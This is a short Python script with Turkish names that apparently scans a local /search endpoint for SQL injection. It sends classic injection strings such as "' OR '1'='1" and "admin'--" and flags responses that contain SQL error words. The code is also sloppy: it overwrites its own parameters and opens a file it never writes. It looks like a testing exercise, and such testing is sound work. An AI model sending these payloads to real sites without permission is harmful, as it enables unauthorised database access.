import requests

def sqli_tara(url, payloadlar, dosya):
 
 with open(dosya, "w", encoding="utf-8"):
  


  url = "http://127.0.0.1:5000/search"

  payloadlar = [
      "'",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "normal_arama"
  ]

  hata_mesajlari = ["sql", "mysql", "syntax", "error"]

  for payload in payloadlar:
      cevap = requests.get(url, params={"q": payload})

      sqli_var = any(hata in cevap.text.lower() for hata in hata_mesajlari)

      if sqli_var:
          print(f"[!]SQLİ bulundu: {payload}")
      else:
          print(f"[+]Temiz: {payload}")